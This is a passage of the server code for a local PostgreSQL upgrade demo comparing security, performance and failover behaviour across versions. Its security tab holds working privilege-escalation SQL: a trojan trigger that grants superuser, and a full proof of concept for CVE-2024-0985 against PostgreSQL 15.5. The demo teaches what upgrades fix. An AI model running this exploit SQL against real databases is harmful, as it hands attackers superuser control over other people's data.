'use strict';

const path = require('path');
const http = require('http');
const { spawn } = require('child_process');
const express = require('express');
const { Pool, Client } = require('pg');

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// --- Node registries --------------------------------------------------------
// Security: identical setup on both, see security/init.sql -- only the
// server's own default privileges differ.
const SEC = {
  old: { id: 'sec-old', host: process.env.SEC_OLD_HOST || 'pg14-security', label: 'PostgreSQL 14', service: 'pg14-security' },
  new: { id: 'sec-new', host: process.env.SEC_NEW_HOST || 'pg18-security', label: 'PostgreSQL 18', service: 'pg18-security' },
};

// Security, second scenario: CVE-2024-0985 (REFRESH MATERIALIZED VIEW
// CONCURRENTLY privilege escalation). A same-major, minor-version-only
// pair on purpose -- see security/init-cve.sql and docker-compose.yml --
// unlike SEC above, which compares major versions. `database: 'rdb'`
// because every object this scenario touches (role r0's own database)
// lives there, not in the default `postgres` database the other pools use.
const CVE = {
  old: { id: 'cve-old', host: process.env.CVE_OLD_HOST || 'pg15-5-security', label: 'PostgreSQL 15.5', service: 'pg15-5-security', database: 'rdb' },
  new: { id: 'cve-new', host: process.env.CVE_NEW_HOST || 'pg15-6-security', label: 'PostgreSQL 15.6', service: 'pg15-6-security', database: 'rdb' },
};

// Performance: same benchmark table, same mem_limit/shared_buffers -- only
// io_method differs (PG17 has no such knob at all).
const PERF = {
  old: { id: 'perf-old', host: process.env.PERF_OLD_HOST || 'pg17-performance', label: 'PostgreSQL 17', service: 'pg17-performance', ioMethod: null },
  new: { id: 'perf-new', host: process.env.PERF_NEW_HOST || 'pg18-performance', label: 'PostgreSQL 18', service: 'pg18-performance', ioMethod: 'worker' },
};

// Reliability: primary + standby + logical subscriber, once per version.
// pgDataPath differs because PG18's on-disk layout is versioned
// (/var/lib/postgresql/18/docker) while PG16 still uses the flat
// /var/lib/postgresql/data -- entrypoint.sh and this file both need it, so
// it's kept in one place here.
const REL = {
  old: {
    label: 'PostgreSQL 16',
    slotName: 'sub',
    supportsFailover: false,
    primary: { id: 'rel-old-primary', host: process.env.REL_OLD_PRIMARY_HOST || 'pg16-primary', service: 'pg16-primary' },
    standby: { id: 'rel-old-standby', host: process.env.REL_OLD_STANDBY_HOST || 'pg16-standby', service: 'pg16-standby', pgData: '/var/lib/postgresql/data' },
    subscriber: { id: 'rel-old-subscriber', host: process.env.REL_OLD_SUBSCRIBER_HOST || 'pg16-subscriber', service: 'pg16-subscriber' },
    // No failover-enabled slot concept exists on PG16 -- the slot is just
    // auto-created on the primary, plainly, by CREATE SUBSCRIPTION itself.
    setupSql: `CREATE SUBSCRIPTION sub
  CONNECTION 'host=pg16-primary port=5432 user=postgres dbname=postgres'
  PUBLICATION pub;
-- slot "sub" auto-created on the primary, plain logical slot, no failover option`,
  },
  new: {
    label: 'PostgreSQL 18',
    slotName: 'sub_slot',
    supportsFailover: true,
    primary: { id: 'rel-new-primary', host: process.env.REL_NEW_PRIMARY_HOST || 'pg18-primary', service: 'pg18-primary' },
    standby: { id: 'rel-new-standby', host: process.env.REL_NEW_STANDBY_HOST || 'pg18-standby', service: 'pg18-standby', pgData: '/var/lib/postgresql/18/docker' },
    subscriber: { id: 'rel-new-subscriber', host: process.env.REL_NEW_SUBSCRIBER_HOST || 'pg18-subscriber', service: 'pg18-subscriber' },
    setupSql: `-- on the primary, BEFORE subscribing: create a slot that follows failover
SELECT pg_create_logical_replication_slot('sub_slot', 'pgoutput', false, true, true);
--                                                                     failover=true ^
-- ...wait for pg_replication_slots.synced = true on the standby, then:

CREATE SUBSCRIPTION sub
  CONNECTION 'host=pg18-primary port=5432 user=postgres dbname=postgres'
  PUBLICATION pub
  WITH (create_slot=false, slot_name='sub_slot', copy_data=true);`,
  },
};

const ALL_PG_NODES = [
  SEC.old, SEC.new,
  CVE.old, CVE.new,
  PERF.old, PERF.new,
  REL.old.primary, REL.old.standby, REL.old.subscriber,
  REL.new.primary, REL.new.standby, REL.new.subscriber,
];

// Security and performance containers use POSTGRES_PASSWORD (scram-sha-256,
// no HOST_AUTH_METHOD override -- more realistic for those two tabs);
// reliability containers use POSTGRES_HOST_AUTH_METHOD=trust, same as this
// project's sibling replication demos. A superuser password is harmless to
// send under trust auth (the server never asks for it), so one constant
// covers every node here.
const PG_SUPERUSER_PASSWORD = 'postgres';

const pools = new Map();
for (const n of ALL_PG_NODES) {
  const pool = new Pool({ host: n.host, port: 5432, user: 'postgres', password: PG_SUPERUSER_PASSWORD, database: n.database || 'postgres', max: 5, connectionTimeoutMillis: 4000 });
  pool.on('error', (err) => console.error(`[app] pool error on ${n.id}:`, err.message));
  pools.set(n.id, pool);
}

function nodeConnInfo(n, overrides) {
  return Object.assign({ host: n.host, port: 5432, user: 'postgres', password: PG_SUPERUSER_PASSWORD, database: n.database || 'postgres', connectionTimeoutMillis: 4000 }, overrides || {});
}

// --- Docker control ----------------------------------------------------------
// Same technique as this project's sibling demos: talk to the Docker Engine
// API over the socket bind-mounted from the host (see docker-compose.yml) to
// find/act on a compose service's *container*, and shell out to the `docker`
// CLI (installed in this image, see Dockerfile) for actions with no clean
// HTTP-API equivalent (promote, compose-level recreate).
const DOCKER_SOCKET = process.env.DOCKER_SOCKET || '/var/run/docker.sock';
const COMPOSE_PROJECT = process.env.COMPOSE_PROJECT_NAME || 'upgrade';
const COMPOSE_FILE = process.env.COMPOSE_FILE_PATH || path.join(process.env.PROJECT_DIR || '', 'docker-compose.yml');

function dockerApiRequest(method, apiPath) {
  return new Promise((resolve, reject) => {
    const req = http.request({ socketPath: DOCKER_SOCKET, path: apiPath, method }, (res) => {
      let data = '';
      res.on('data', (c) => (data += c));
      res.on('end', () => {
        if (res.statusCode >= 400 && res.statusCode !== 304) {
          reject(new Error(`Docker API ${method} ${apiPath} -> ${res.statusCode}: ${data || res.statusMessage}`));
          return;
        }
        resolve(data ? JSON.parse(data) : null);
      });
    });
    req.on('error', (err) => reject(new Error(`Docker socket unavailable: ${err.message}`)));
    req.end();
  });
}

async function findContainer(serviceName) {
  const filters = encodeURIComponent(JSON.stringify({ label: [`com.docker.compose.service=${serviceName}`] }));
  const containers = await dockerApiRequest('GET', `/containers/json?all=true&filters=${filters}`);
  if (!containers || !containers.length) throw new Error(`no container found for compose service "${serviceName}"`);
  return containers[0];
}

async function stopContainer(serviceName) {
  const c = await findContainer(serviceName);
  await dockerApiRequest('POST', `/containers/${c.Id}/stop?t=5`);
}

async function containerStatus(serviceName) {
  try {
    const c = await findContainer(serviceName);
    return { running: c.State === 'running', state: c.State, status: c.Status };
  } catch (err) {
    return { running: null, error: err.message };
  }
}

function runCmd(cmd, args) {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args);
    let output = '';
    child.stdout.on('data', (c) => (output += c));
    child.stderr.on('data', (c) => (output += c));
    child.on('error', reject);
    child.on('close', (code) => {
      if (code !== 0) {
        reject(new Error(output.trim() || `${cmd} exited with code ${code}`));
        return;
      }
      resolve(output.trim());
    });
  });
}

async function dockerExec(containerId, cmdArgs) {
  return runCmd('docker', ['exec', '-u', 'postgres', containerId, ...cmdArgs]);
}

async function promoteStandby(rel) {
  const container = await findContainer(rel.standby.service);
  return dockerExec(container.Id, ['pg_ctl', '-D', rel.standby.pgData, 'promote']);
}

// "Reset" recreates a version's 3 reliability containers from scratch,
// including their volumes, via `docker compose` itself (installed in this
// image) rather than hand-rolling container specs against the raw Docker
// API. This is the same "full control of the docker host" tradeoff as the
// socket mount itself -- fine for this local, single-user demo.
async function resetReliability(rel, volumeNames) {
  const services = [rel.primary.service, rel.standby.service, rel.subscriber.service];
  const composeArgs = ['compose', '-p', COMPOSE_PROJECT, '-f', COMPOSE_FILE];
  await runCmd('docker', [...composeArgs, 'stop', ...services]).catch(() => {});
  await runCmd('docker', [...composeArgs, 'rm', '-f', ...services]).catch(() => {});
  for (const v of volumeNames) {
    await runCmd('docker', ['volume', 'rm', `${COMPOSE_PROJECT}_${v}`]).catch(() => {});
  }
  await runCmd('docker', [...composeArgs, 'up', '-d', ...services]);
}

// --- Reliability bootstrap ---------------------------------------------------
// Mirrors the exact sequence verified by hand against these images: create
// the publication-side subscription on PG16 (slot auto-created, no failover
// concept exists); on PG18, create a failover-enabled logical slot first and
// wait for it to show up synced on the standby before subscribing, since the
// sync worker needs a few seconds after the slot is created.
async function waitFor(fn, timeoutMs, intervalMs) {
  const start = Date.now();
  // eslint-disable-next-line no-constant-condition
  while (true) {
    const result = await fn().catch(() => null);
    if (result) return result;
    if (Date.now() - start > timeoutMs) throw new Error('timed out waiting for condition');
    await sleep(intervalMs);
  }
}

async function subscriptionExists(rel) {
  const r = await pools.get(rel.subscriber.id).query("SELECT 1 FROM pg_subscription WHERE subname = 'sub'");
  return r.rowCount > 0;
}

async function bootstrapReliabilityOld(rel) {
  if (await subscriptionExists(rel)) return;
  await waitFor(() => pools.get(rel.primary.id).query('SELECT 1'), 60000, 1500);
  await pools.get(rel.subscriber.id).query(
    `CREATE SUBSCRIPTION sub CONNECTION 'host=${rel.primary.host} port=5432 user=postgres dbname=postgres' PUBLICATION pub`
  );
}

async function bootstrapReliabilityNew(rel) {
  if (await subscriptionExists(rel)) return;
  await waitFor(() => pools.get(rel.primary.id).query('SELECT 1'), 60000, 1500);
  await waitFor(() => pools.get(rel.standby.id).query('SELECT 1'), 60000, 1500);

  // Create the failover-enabled slot if it isn't already there (idempotent
  // across restarts), then wait for the standby's sync worker to pick it up.
  const existing = await pools.get(rel.primary.id).query(
    "SELECT 1 FROM pg_replication_slots WHERE slot_name = $1",
    [rel.slotName]
  );
  if (existing.rowCount === 0) {
    await pools.get(rel.primary.id).query(
      "SELECT pg_create_logical_replication_slot($1, 'pgoutput', false, true, true)",
      [rel.slotName]
    );
  }
  await waitFor(async () => {
    const r = await pools.get(rel.standby.id).query(
      'SELECT synced FROM pg_replication_slots WHERE slot_name = $1',
      [rel.slotName]
    );
    return r.rows[0] && r.rows[0].synced ? true : null;
  }, 45000, 2000);

  await pools.get(rel.subscriber.id).query(
    `CREATE SUBSCRIPTION sub CONNECTION 'host=${rel.primary.host} port=5432 user=postgres dbname=postgres' PUBLICATION pub ` +
      `WITH (create_slot=false, slot_name='${rel.slotName}', copy_data=true)`
  );
}

// --- Performance bootstrap ---------------------------------------------------
// Same seed on both nodes. `payload`/`val`/`bench_val_idx` are vestigial --
// they backed this tab's earlier async-I/O scenarios (bitmap heap scan,
// sequential scan), which got dropped because they need slow storage to
// show any difference on typical Docker Desktop hardware. Left in place
// rather than migrated out, so a fresh provision and this project's
// already-seeded volumes stay schema-identical.
//
// tenant_id/serial_no are what the one scenario left (skip scan) actually
// uses: a low-cardinality leading column (tenant_id, 20 values) plus a
// highly selective trailing column (serial_no, effectively unique) with
// ONLY a composite index across both -- no standalone index on serial_no.
// That's the exact shape PG18's B-tree skip scan targets: a query with no
// predicate on the leading column at all.
async function seedPerformance(node) {
  const pool = pools.get(node.id);
  const existing = await pool.query('SELECT to_regclass($1) AS t', ['public.bench']);
  if (existing.rows[0].t) return;
  console.log(`[app] seeding benchmark table on ${node.id} (this takes a while on first boot)...`);
  await pool.query(`
    CREATE TABLE bench (id bigint PRIMARY KEY, payload text, val int, tenant_id int, serial_no bigint);
    INSERT INTO bench
      SELECT g, repeat('x', 200), (random() * 1000000)::int, ((g - 1) % 20) + 1, g
      FROM generate_series(1, 12000000) g;
    CREATE INDEX bench_val_idx ON bench (val);
    CREATE INDEX bench_tenant_serial_idx ON bench (tenant_id, serial_no);
    ANALYZE bench;
  `);
  console.log(`[app] benchmark table ready on ${node.id}`);
}

// Older deployments already have `bench` seeded without tenant_id/serial_no
// (this scenario was added after the initial seed) -- backfill those in
// place rather than requiring a full reset. A fresh seedPerformance() above
// already includes them, so this is a no-op there.
async function ensureSkipScanColumns(node) {
  const pool = pools.get(node.id);
  const existing = await pool.query(
    "SELECT 1 FROM information_schema.columns WHERE table_name = 'bench' AND column_name = 'tenant_id'"
  );
  if (existing.rowCount > 0) return;
  console.log(`[app] backfilling skip-scan demo columns on ${node.id} (this takes a while)...`);
  await pool.query(`
    ALTER TABLE bench ADD COLUMN tenant_id int, ADD COLUMN serial_no bigint;
    UPDATE bench SET tenant_id = ((id - 1) % 20) + 1, serial_no = id;
    CREATE INDEX bench_tenant_serial_idx ON bench (tenant_id, serial_no);
    ANALYZE bench;
  `);
  console.log(`[app] skip-scan demo columns ready on ${node.id}`);
}

async function bootstrapAll() {
  await Promise.all([
    waitFor(() => pools.get(REL.old.primary.id).query('SELECT 1'), 120000, 2000),
    waitFor(() => pools.get(REL.new.primary.id).query('SELECT 1'), 120000, 2000),
  ]);
  await bootstrapReliabilityOld(REL.old);
  await bootstrapReliabilityNew(REL.new);
  await Promise.all([seedPerformance(PERF.old), seedPerformance(PERF.new)]);
  await Promise.all([ensureSkipScanColumns(PERF.old), ensureSkipScanColumns(PERF.new)]);
}

let bootstrapDone = false;
let bootstrapError = null;
async function bootstrapWithRetry() {
  const start = Date.now();
  const timeoutMs = 20 * 60 * 1000;
  // eslint-disable-next-line no-constant-condition
  while (true) {
    try {
      await bootstrapAll();
      bootstrapDone = true;
      bootstrapError = null;
      console.log('[app] bootstrap complete');
      return;
    } catch (err) {
      bootstrapError = err.message;
      if (Date.now() - start > timeoutMs) {
        console.error('[app] bootstrap failed:', err.message);
        return;
      }
      console.log('[app] bootstrap retrying...', err.message);
      await sleep(3000);
    }
  }
}

// --- App ----------------------------------------------------------------------
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function asyncRoute(fn) {
  return (req, res) => {
    fn(req, res).catch((err) => {
      console.error(err);
      res.status(err.status || 500).json({ error: err.message || 'internal error' });
    });
  };
}

bootstrapWithRetry();

app.get('/api/health', (req, res) => res.status(bootstrapDone ? 200 : 503).json({ bootstrapDone, bootstrapError }));

// ---- Security ----------------------------------------------------------------
async function securityStatus(sec) {
  const pool = pools.get(sec.id);
  const role = await pool.query("SELECT rolsuper FROM pg_roles WHERE rolname = 'app_user'").catch(() => ({ rows: [{}] }));
  const publicPriv = await pool.query(
    "SELECT has_schema_privilege('app_user', 'public', 'CREATE') AS can_create"
  );
  const deployLog = await pool.query("SELECT to_regclass('public.deploy_log') AS t");
  return {
    id: sec.id,
    label: sec.label,
    rolsuper: role.rows[0] ? role.rows[0].rolsuper : null,
    canCreateOnPublic: publicPriv.rows[0].can_create,
    hasDeployLog: !!deployLog.rows[0].t,
  };
}

app.get(
  '/api/security/status',
  asyncRoute(async (req, res) => {
    const [old, neu] = await Promise.all([securityStatus(SEC.old), securityStatus(SEC.new)]);
    res.json({ old, new: neu });
  })
);

// Each SQL string here is the literal text sent to Postgres *and* the text
// shown in the UI's "query just run" preview -- one source, so the preview
// can never drift from what actually executed.
const SEC_SQL = {
  attack: `CREATE TABLE public.deploy_log (id serial primary key, note text, logged_at timestamptz default now());

CREATE FUNCTION public.deploy_log_trg() RETURNS trigger AS $$
BEGIN EXECUTE 'ALTER ROLE app_user WITH SUPERUSER'; RETURN NEW; END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_pwn AFTER INSERT ON public.deploy_log
FOR EACH ROW EXECUTE FUNCTION public.deploy_log_trg();`,
  deploy: `CREATE TABLE IF NOT EXISTS public.deploy_log (id serial primary key, note text, logged_at timestamptz default now());

INSERT INTO public.deploy_log(note) VALUES ('release deployed');`,
  reset: `DROP TABLE IF EXISTS public.deploy_log CASCADE;
DROP FUNCTION IF EXISTS public.deploy_log_trg CASCADE;
ALTER ROLE app_user WITH NOSUPERUSER;`,
};

// Step 1: the low-priv attacker plants the trojan table+trigger. On PG18
// this fails immediately at the CREATE TABLE, exactly as it should.
app.post(
  '/api/security/attack',
  asyncRoute(async (req, res) => {
    const target = req.body.target === 'new' ? SEC.new : SEC.old;
    const client = new Client(nodeConnInfo(target, { user: 'app_user', password: 'app_user' }));
    await client.connect();
    try {
      await client.query(SEC_SQL.attack);
      res.json({ ok: true, blocked: false, sql: SEC_SQL.attack, ranAs: 'app_user' });
    } catch (err) {
      res.json({ ok: false, blocked: true, error: err.message, sql: SEC_SQL.attack, ranAs: 'app_user' });
    } finally {
      await client.end().catch(() => {});
    }
  })
);

// Step 2: the DBA's routine, idempotent deploy step -- entirely ordinary on
// its own; it only becomes dangerous because of step 1.
app.post(
  '/api/security/deploy',
  asyncRoute(async (req, res) => {
    const target = req.body.target === 'new' ? SEC.new : SEC.old;
    const pool = pools.get(target.id);
    try {
      await pool.query(SEC_SQL.deploy);
      const after = await pool.query("SELECT rolsuper FROM pg_roles WHERE rolname = 'app_user'");
      res.json({ ok: true, rolsuper: after.rows[0].rolsuper, sql: SEC_SQL.deploy, ranAs: 'postgres' });
    } catch (err) {
      res.json({ ok: false, error: err.message, sql: SEC_SQL.deploy, ranAs: 'postgres' });
    }
  })
);

app.post(
  '/api/security/reset',
  asyncRoute(async (req, res) => {
    const target = req.body.target === 'new' ? SEC.new : SEC.old;
    const pool = pools.get(target.id);
    await pool.query(SEC_SQL.reset);
    res.json({ ok: true, sql: SEC_SQL.reset, ranAs: 'postgres' });
  })
);

// ---- Security, second scenario: CVE-2024-0985 --------------------------------
// REFRESH MATERIALIZED VIEW CONCURRENTLY is meant to run functions inside the
// view's definition as the view's *owner*, not the (often more privileged)
// user issuing the REFRESH -- that's the whole point, it lets a privileged
// user safely refresh a view someone else created. The bug: while building
// its own internal temp table, Postgres briefly leaves security-restricted
// mode, and the attacker's materialized view (via a deferred constraint
// trigger + a CREATE RULE trick that converts that temp table into a view)
// hijacks that moment to run SQL as the REFRESH caller instead. Verified by
// hand against real postgres:15.5 and postgres:15.6 containers: identical
// setup escalates role r0 to superuser on 15.5, and fails with a clean
// "is not a table" error -- no escalation -- on 15.6.
async function cveStatus(cve) {
  const pool = pools.get(cve.id);
  const role = await pool.query("SELECT rolsuper FROM pg_roles WHERE rolname = 'r0'").catch(() => ({ rows: [{}] }));
  const mv = await pool.query("SELECT to_regclass('public.mv') AS t");
  return {
    id: cve.id,
    label: cve.label,
    rolsuper: role.rows[0] ? role.rows[0].rolsuper : null,
    hasMv: !!mv.rows[0].t,
  };
}

app.get(
  '/api/cve/status',
  asyncRoute(async (req, res) => {
    const [old, neu] = await Promise.all([cveStatus(CVE.old), cveStatus(CVE.new)]);
    res.json({ old, new: neu });
  })
);

const CVE_SQL = {
  attack: `CREATE FUNCTION pwn() RETURNS trigger AS $$
BEGIN
    IF current_setting('is_superuser')::text = 'on' THEN
        ALTER USER r0 SUPERUSER;
    END IF;
    DROP VIEW IF EXISTS remove_later;
    RETURN NEW;
END $$ LANGUAGE plpgsql;

CREATE TABLE t1(i INTEGER);
CREATE CONSTRAINT TRIGGER trig
    AFTER INSERT ON t1
    INITIALLY DEFERRED
    FOR EACH ROW EXECUTE PROCEDURE pwn();

CREATE FUNCTION get_target() RETURNS TEXT AS $$
    SELECT format('%I.%I',
      pg_my_temp_schema()::regnamespace,
      'pg_temp_' || 'mv'::text::regclass::oid
    );
$$ LANGUAGE SQL STABLE;

CREATE FUNCTION attack() RETURNS INTEGER AS $$
DECLARE
  target TEXT := get_target();
BEGIN
    BEGIN
        INSERT INTO t1 VALUES (1);
        EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
        EXECUTE format('CREATE TEMP TABLE %s()', target);
    EXCEPTION WHEN OTHERS THEN
    END;
    RETURN 2;
END $$ LANGUAGE plpgsql;

CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
DECLARE
    target TEXT := get_target();
BEGIN
    IF to_regclass(target) IS NOT NULL THEN
        EXECUTE format(
          'CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD '
          'SELECT attack() AS i, 1 as x', target
        );
        EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
    END IF;
    RETURN;
END $$ LANGUAGE plpgsql;

CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
CREATE UNIQUE INDEX ix_mv_i ON mv (i);`,
  refresh: `REFRESH MATERIALIZED VIEW CONCURRENTLY mv;`,
  reset: `DROP MATERIALIZED VIEW IF EXISTS mv CASCADE;
DROP FUNCTION IF EXISTS conv() CASCADE;
DROP FUNCTION IF EXISTS attack() CASCADE;
DROP FUNCTION IF EXISTS get_target() CASCADE;
DROP FUNCTION IF EXISTS pwn() CASCADE;
DROP TABLE IF EXISTS t1 CASCADE;
DROP VIEW IF EXISTS remove_later CASCADE;
ALTER USER r0 NOSUPERUSER;`,
};

// Step 1: the low-priv attacker (role r0, owner of its own database rdb --
// an ordinary onboarding step, not a special grant) plants the malicious
// materialized view. This step succeeds on BOTH versions -- there's nothing
// for the fix to block here, it's just setup.
app.post(
  '/api/cve/attack',
  asyncRoute(async (req, res) => {
    const target = req.body.target === 'new' ? CVE.new : CVE.old;
    const client = new Client(nodeConnInfo(target, { user: 'r0', password: 'r0' }));
    await client.connect();
    try {
      await client.query(CVE_SQL.attack);
      res.json({ ok: true, blocked: false, sql: CVE_SQL.attack, ranAs: 'r0' });
    } catch (err) {
      res.json({ ok: false, blocked: true, error: err.message, sql: CVE_SQL.attack, ranAs: 'r0' });
    } finally {
      await client.end().catch(() => {});
    }
  })
);

// Step 2: an ordinary admin task -- refreshing a materialized view someone
// else owns is exactly what REFRESH MATERIALIZED VIEW CONCURRENTLY exists
// to do safely. On 15.5 this silently makes r0 superuser; on 15.6 it fails
// with a clean error instead (the fix), which is where this scenario's
// "blocked" moment actually is -- the opposite step from the tab's other
// scenario above.
app.post(
  '/api/cve/refresh',
  asyncRoute(async (req, res) => {
    const target = req.body.target === 'new' ? CVE.new : CVE.old;
    const pool = pools.get(target.id);
    try {
      await pool.query(CVE_SQL.refresh);
      const after = await pool.query("SELECT rolsuper FROM pg_roles WHERE rolname = 'r0'");
      res.json({ ok: true, blocked: false, rolsuper: after.rows[0].rolsuper, sql: CVE_SQL.refresh, ranAs: 'postgres' });
    } catch (err) {
      res.json({ ok: false, blocked: true, error: err.message, sql: CVE_SQL.refresh, ranAs: 'postgres' });
    }
  })
);

app.post(
  '/api/cve/reset',
  asyncRoute(async (req, res) => {
    const target = req.body.target === 'new' ? CVE.new : CVE.old;
    const pool = pools.get(target.id);
    await pool.query(CVE_SQL.reset);
    res.json({ ok: true, sql: CVE_SQL.reset, ranAs: 'postgres' });
  })
);

// ---- Performance ---------------------------------------------------------------
async function performanceStatus(node) {
  const pool = pools.get(node.id);
  const seeded = await pool.query("SELECT to_regclass('public.bench') AS t");
  const skipScanReady = await pool.query(
    "SELECT 1 FROM information_schema.columns WHERE table_name = 'bench' AND column_name = 'tenant_id'"
  );
  return {
    id: node.id,
    label: node.label,
    seeded: !!seeded.rows[0].t,
    skipScanReady: skipScanReady.rowCount > 0,
  };
}

app.get(
  '/api/performance/status',
  asyncRoute(async (req, res) => {
    const [old, neu] = await Promise.all([performanceStatus(PERF.old), performanceStatus(PERF.new)]);
    res.json({ old, new: neu, bootstrapDone });
  })
);

// The only scenario left in this tab: see the comment on
// `bench_tenant_serial_idx` above for why this exact query shape (no
// predicate on the composite index's leading column) is what PG18's B-tree
// skip scan targets, and why it's a better fit here than the async-I/O
// scenarios this tab used to also carry -- those needed slow storage to
// show a difference (see git history), this doesn't.
const SKIP_SCAN_SQL = 'SELECT count(*) FROM bench WHERE serial_no = $1';
const SKIP_SCAN_PARAMS = [6000000];

// Sums the buffer pages a plan actually touched (Postgres's own count, not
// wall-clock) across every node in the plan tree -- the metric that makes
// this scenario's win visible regardless of storage speed: it's the same
// whether the read comes from a fast local disk or shared_buffers.
function sumPlanBuffers(planNode) {
  let total = (planNode['Shared Hit Blocks'] || 0) + (planNode['Shared Read Blocks'] || 0);
  for (const child of planNode.Plans || []) total += sumPlanBuffers(child);
  return total;
}

async function timedQueryWithBuffers(pool, sql, params, reps) {
  const timings = [];
  const buffers = [];
  for (let i = 0; i < reps; i++) {
    const r = await pool.query(`EXPLAIN (ANALYZE, BUFFERS, FORMAT JSON) ${sql}`, params);
    const plan = r.rows[0]['QUERY PLAN'][0];
    // Keep sub-ms precision -- this scenario is fast enough (sub-millisecond
    // on PG18) that rounding to whole ms would show "0" and look broken.
    timings.push(Math.round(plan['Execution Time'] * 100) / 100);
    buffers.push(sumPlanBuffers(plan.Plan));
  }
  return { timings, buffers };
}

app.post(
  '/api/performance/run',
  asyncRoute(async (req, res) => {
    const reps = Math.min(Math.max(parseInt(req.body.reps, 10) || 3, 1), 6);
    const [oldResult, newResult] = await Promise.all([
      timedQueryWithBuffers(pools.get(PERF.old.id), SKIP_SCAN_SQL, SKIP_SCAN_PARAMS, reps),
      timedQueryWithBuffers(pools.get(PERF.new.id), SKIP_SCAN_SQL, SKIP_SCAN_PARAMS, reps),
    ]);
    res.json({
      sql: SKIP_SCAN_SQL,
      reps,
      old: oldResult.timings,
      new: newResult.timings,
      buffers: { old: oldResult.buffers, new: newResult.buffers },
    });
  })
);

// ---- Reliability -----------------------------------------------------------
async function replicaState(node) {
  try {
    const r = await pools.get(node.id).query('SELECT pg_is_in_recovery() AS standby');
    return { reachable: true, role: r.rows[0].standby ? 'standby' : 'primary' };
  } catch (err) {
    return { reachable: false, error: err.message };
  }
}

async function reliabilityStatus(rel) {
  const [primary, standby] = await Promise.all([replicaState(rel.primary), replicaState(rel.standby)]);
  // pg_replication_slots.failover doesn't exist before PG17 -- select it
  // only for the version that has it, rather than letting the whole query
  // fail silently on the other.
  const slotCols = rel.supportsFailover ? 'slot_name, slot_type, active, failover' : 'slot_name, slot_type, active';
  const slots = await pools
    .get((primary.role === 'primary' ? rel.primary : rel.standby).id)
    .query(`SELECT ${slotCols} FROM pg_replication_slots ORDER BY slot_name`)
    .then((r) => r.rows)
    .catch(() => []);
  const rows = await pools
    .get(rel.subscriber.id)
    .query('SELECT id, note, created_at FROM demo_events ORDER BY id')
    .then((r) => r.rows)
    .catch(() => []);
  const subWorker = await pools
    .get(rel.subscriber.id)
    .query('SELECT pid FROM pg_stat_subscription WHERE subname = $1', ['sub'])
    .then((r) => (r.rows[0] ? r.rows[0].pid : null))
    .catch(() => null);
  return {
    label: rel.label,
    supportsFailover: rel.supportsFailover,
    setupSql: rel.setupSql,
    primary: { ...primary, container: await containerStatus(rel.primary.service) },
    standby: { ...standby, container: await containerStatus(rel.standby.service) },
    slots,
    subscriberRows: rows,
    subscriptionWorkerRunning: !!subWorker,
  };
}

app.get(
  '/api/reliability/status',
  asyncRoute(async (req, res) => {
    const [old, neu] = await Promise.all([reliabilityStatus(REL.old), reliabilityStatus(REL.new)]);
    res.json({ old, new: neu });
  })
);

app.post(
  '/api/reliability/write',
  asyncRoute(async (req, res) => {
    const rel = req.body.version === 'new' ? REL.new : REL.old;
    const note = typeof req.body.note === 'string' && req.body.note ? req.body.note : `write @ ${new Date().toISOString()}`;
    // Whichever node currently reports itself as primary -- after a
    // failover that's the promoted former standby.
    const primaryState = await replicaState(rel.primary);
    const target = primaryState.role === 'primary' ? rel.primary : rel.standby;
    const sql = 'INSERT INTO demo_events(note) VALUES ($1) RETURNING *';
    const r = await pools.get(target.id).query(sql, [note]);
    res.json({ ok: true, wroteTo: target.id, row: r.rows[0], sql: `${sql}\n-- $1 = '${note}'` });
  })
);

// The core "aha": promote the standby, then repoint the subscriber at it.
// On PG18 this just keeps working (failover-persistent slot). On PG16 the
// repoint succeeds but the subscription worker then fails, because the
// slot never existed on the promoted node.
app.post(
  '/api/reliability/failover',
  asyncRoute(async (req, res) => {
    const rel = req.body.version === 'new' ? REL.new : REL.old;
    // A real failover starts with the primary actually going down --
    // without this, the old primary would keep answering as "primary"
    // forever (Postgres itself has no idea a standby got promoted
    // elsewhere), and subsequent writes would silently go to a dead end
    // instead of the newly-promoted node.
    const stopCmd = `docker stop ${rel.primary.service}   # simulates the primary actually going down`;
    await stopContainer(rel.primary.service).catch((err) => console.error('[app] stop primary failed:', err.message));
    await sleep(1000);
    const promoteCmd = `docker exec -u postgres <${rel.standby.service}> pg_ctl -D ${rel.standby.pgData} promote`;
    const promoteOutput = await promoteStandby(rel).catch((err) => `promote error: ${err.message}`);
    await sleep(2000);
    const alterSql = `ALTER SUBSCRIPTION sub CONNECTION 'host=${rel.standby.host} port=5432 user=postgres dbname=postgres';`;
    let alterError = null;
    try {
      await pools.get(rel.subscriber.id).query(alterSql);
    } catch (err) {
      alterError = err.message;
    }
    await sleep(3000);
    const status = await reliabilityStatus(rel);
    res.json({
      ok: true,
      promoteOutput,
      alterError,
      status,
      commands: `${stopCmd}\n${promoteCmd}\n${alterSql}`,
    });
  })
);

app.post(
  '/api/reliability/reset',
  asyncRoute(async (req, res) => {
    const version = req.body.version === 'new' ? 'new' : 'old';
    const rel = REL[version];
    const volumeNames =
      version === 'new'
        ? ['pgdata-pg18-primary', 'pgdata-pg18-standby', 'pgdata-pg18-subscriber']
        : ['pgdata-pg16-primary', 'pgdata-pg16-standby', 'pgdata-pg16-subscriber'];
    await resetReliability(rel, volumeNames);
    // `docker compose up -d` returns once containers are *started*, not
    // once their healthchecks pass -- wait for all three to actually
    // accept connections before re-running the bootstrap SQL against them.
    await Promise.all(
      [rel.primary, rel.standby, rel.subscriber].map((n) => waitFor(() => pools.get(n.id).query('SELECT 1'), 60000, 1500))
    );
    if (version === 'new') await bootstrapReliabilityNew(rel);
    else await bootstrapReliabilityOld(rel);
    res.json({ ok: true });
  })
);

// ---- SQL console --------------------------------------------------------------
const SQL_CONSOLE_ROW_LIMIT = 500;
const CONSOLE_NODES = new Map(ALL_PG_NODES.map((n) => [n.id, n]));

app.get('/api/meta', (req, res) => {
  res.json({
    security: { old: SEC.old, new: SEC.new },
    performance: { old: PERF.old, new: PERF.new },
    reliability: {
      old: { primary: REL.old.primary, standby: REL.old.standby, subscriber: REL.old.subscriber, label: REL.old.label },
